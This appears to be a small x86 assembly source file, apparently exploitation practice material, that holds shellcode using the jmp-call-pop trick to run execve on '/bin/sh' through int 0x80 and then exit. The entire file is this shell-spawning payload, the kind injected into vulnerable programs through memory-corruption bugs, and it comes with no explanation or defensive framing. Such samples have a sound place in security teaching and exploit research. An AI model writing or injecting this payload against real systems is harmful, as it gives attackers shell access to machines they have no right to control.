BITS 32

jmp short _one

_two:
pop ebx
xor eax, eax
mov al, 0xb
xor ecx, ecx
xor edx, edx
int 0x80

mov al, 0x1
xor ebx, ebx
int 0x80

_one:
call _two
db '/bin/sh'
